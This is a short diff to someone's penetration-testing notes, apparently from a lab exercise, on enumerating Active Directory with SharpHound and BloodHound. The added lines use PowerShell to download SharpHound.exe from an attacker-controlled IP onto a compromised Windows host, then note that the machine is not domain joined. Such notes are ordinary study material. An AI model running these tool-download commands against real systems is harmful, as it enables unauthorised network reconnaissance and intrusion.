@@ -560,4 +560,12 @@ Enumerating Via sharphound/bloodhound
 iwr -uri "http://192.168.45.228:8888/SharpHound.ps1" -outfile "C:\Users\Public\Downloads\sharp.ps1"
 ```
 
+.ps1 not working trying exe
+
+``` powershell
+iwr -uri "http://192.168.45.228:8888/SharpHound.exe" -outfile "C:\Users\Public\Downloads\sharp.exe"
+```
+
+This machine is not domain joined.... At least I am not authenticated as a domain user, so bloodhound is not of use. moving to next step
+
 Now to [[Pivot]]
